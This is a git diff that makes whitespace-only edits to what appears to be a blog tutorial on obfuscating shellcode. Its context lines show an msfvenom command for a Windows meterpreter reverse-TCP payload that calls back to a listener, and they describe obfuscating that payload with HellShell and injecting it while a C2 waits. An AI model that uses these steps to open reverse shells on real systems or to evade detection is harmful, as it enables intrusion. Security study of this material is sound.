@@ -113,7 +113,8 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.86 LPORT=8080 -f
 But as we have already mentioned earlier that we need to deobfuscate the payload as well. Using the tools like HellShell would be much easier on this case, since it not only provides the obfuscated code, but also provides a code block inorder to deobfuscate it. So, once we transfer the payload on our Windows attacker machine, we can use HellShell to obsucate it. Make sure to compile the HellShell on **Release** otherwise it would give some errors.
 <img alt="" class="bf jp jq dj" loading="lazy" role="presentation" src="https://raw.githubusercontent.com/nirajkharel/nirajkharel.github.io/master/assets/img/images/payload-obfuscation-10.png">
 
-Until now, we have everything ready to listen and wait for the connection on the C2 side. Now lets talk about the deobfuscation of the payload. The below code is the output of HellShell which contains a function **UuidDeobfuscation whose** return type is BOOL.
+Until now, we have everything ready to listen and wait for the connection on the C2 side. Now lets talk about the deobfuscation of the payload. The below code is the output of HellShell which contains a function **UuidDeobfuscation whose** return type is BOOL.    
+
 ```C
 // Execute
 HellShell.exe .\win-shellcode.bin uuid
@@ -190,7 +191,8 @@ BOOL UuidDeobfuscation(IN CHAR* UuidArray[], IN SIZE_T NmbrOfElements, OUT PBYTE
 
 ```
 
-Main Method
+Main Method 
+
 ```C
 // shellcode injection
 int main() {
